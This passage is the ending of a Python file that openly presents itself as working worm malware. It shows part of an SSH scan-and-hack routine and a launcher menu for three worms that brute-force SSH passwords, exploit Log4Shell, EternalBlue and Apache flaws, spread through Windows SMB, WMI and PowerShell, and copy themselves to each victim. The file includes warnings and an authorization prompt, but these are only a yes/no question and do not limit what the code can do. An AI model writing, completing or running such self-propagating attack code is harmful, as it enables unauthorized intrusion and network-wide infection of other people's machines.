                            
                            ssh.close()
                            break
                        except:
                            pass
                sock.close()
            except:
                pass
    
    # Run the worm
    network = get_network()
    print(f"[*] Scanning {network}0/24")
    scan_and_hack(network)


# ==============================================================================
# MAIN EXECUTION
# ==============================================================================

def main():
    print("""
⚠️⚠️⚠️ WARNING ⚠️⚠️⚠️

This file contains THREE types of worms:

1. SimpleNetworkWorm (Basic)
   - Scans network for SSH
   - Tries weak passwords
   - Displays "Hello World"
   - Self-replicates
   Target: Linux/Unix systems

2. AdvancedWorm (Dangerous) ⚠️⚠️⚠️
   - Everything from SimpleNetworkWorm PLUS:
   - Scans for known CVE vulnerabilities
   - Exploits Log4Shell, EternalBlue, Apache flaws
   - Multiple attack vectors
   Target: Linux/Unix + Windows systems

3. WindowsSMBWorm (Windows-Specific) ⚠️⚠️⚠️
   - WMI Fileless Execution (memory-only)
   - PowerShell Remoting (no disk writes)
   - Scheduled Task + URL downloads
   - ADMIN$ Share file copy
   - Public Share infection
   Target: Windows networks (like WannaCry/Emotot)

This is REAL WORKING MALWARE CODE!

What happens when you run:
1. Scans your local network (192.168.x.x)
2. Finds computers with open ports
3. Tries to exploit known vulnerabilities
4. Tries common passwords (admin:admin, root:root, etc.)
5. If successful, displays "Hello World You've Been Hacked!"
6. Copies itself to the victim
7. Victim machine then infects other machines
8. Spreads exponentially through the network

ONLY RUN IF:
✓ You own ALL machines on the network
✓ You are in an isolated lab environment
✓ You have written authorization
✓ You understand the consequences

NEVER RUN ON:
✗ Public networks (coffee shop, school, etc.)
✗ Work/company networks
✗ Any network you don't fully own
✗ Networks with other people's computers

Unauthorized use is ILLEGAL!
""")
    
    # Ask which worm to run
    print("\nSelect worm type:")
    print("1. Simple Worm (SSH brute force only - Linux targets)")
    print("2. Advanced Worm (CVE exploits + SSH - Multi-platform) ⚠️⚠️⚠️")
    print("3. Windows SMB Worm (Multiple Windows infection methods) ⚠️⚠️⚠️")
    print("4. Exit (just study the code)")
    
    choice = input("\nEnter choice (1/2/3/4): ").strip()
    
    if choice == '4':
        print("\n✓ Good decision! Study the code instead.")
        print("\nKey concepts to understand:")
        print("\n📚 Linux/SSH Techniques:")
        print("  1. Network scanning - Finding vulnerable targets")
        print("  2. SSH brute force - Trying common passwords")
        print("  3. CVE exploitation - Exploiting known vulnerabilities")
        print("  4. Remote execution - Running commands on victim")
        print("  5. Self-replication - Copying malware to victims")
        print("\n📚 Windows SMB Techniques:")
        print("  1. WMI Execution - Fileless attacks (no disk writes)")
        print("  2. PowerShell Remoting - Memory-only execution")
        print("  3. Scheduled Tasks - Persistence mechanisms")
        print("  4. Admin Share Exploitation - Traditional file copy")
        print("  5. Public Share Infection - Social engineering")
        print("\n📚 Advanced Concepts:")
        print("  1. Multi-vector attacks - Try multiple methods")
        print("  2. Credential harvesting - Reuse found passwords")
        print("  3. Lateral movement - Spread through network")
        print("  4. Autonomous spreading - Each victim infects others")
        print("  5. Defense evasion - Stealth techniques")
        print("\nThis is how real worms like WannaCry, Mirai, Emotot spread!")
        return
    
    response = input("\nDo you have authorization and are in a lab? (yes/no): ")
    
    if response.lower() != 'yes':
        print("\n✓ Good decision! Study the code instead.")
        return
    
    print("\n[*] Starting worm...\n")
    time.sleep(1)
    
    # Create and start the appropriate worm
    if choice == '1':
        print("[*] Launching Simple Worm (SSH only)")
        worm = SimpleNetworkWorm()
        worm.start()
    elif choice == '2':
        print("[*] Launching Advanced Worm (Multi-exploit)")
        print("[*] This will scan for CVE vulnerabilities!")
        worm = AdvancedWorm()
        worm.start()
    elif choice == '3':
        print("[*] Launching Windows SMB Worm (Multiple infection methods)")
        print("[*] This will try fileless, WMI, PowerShell, and file-based attacks!")
        worm = WindowsSMBWorm()
        worm.start()
    else:
        print("Invalid choice. Exiting.")
        return


if __name__ == "__main__":
    main()
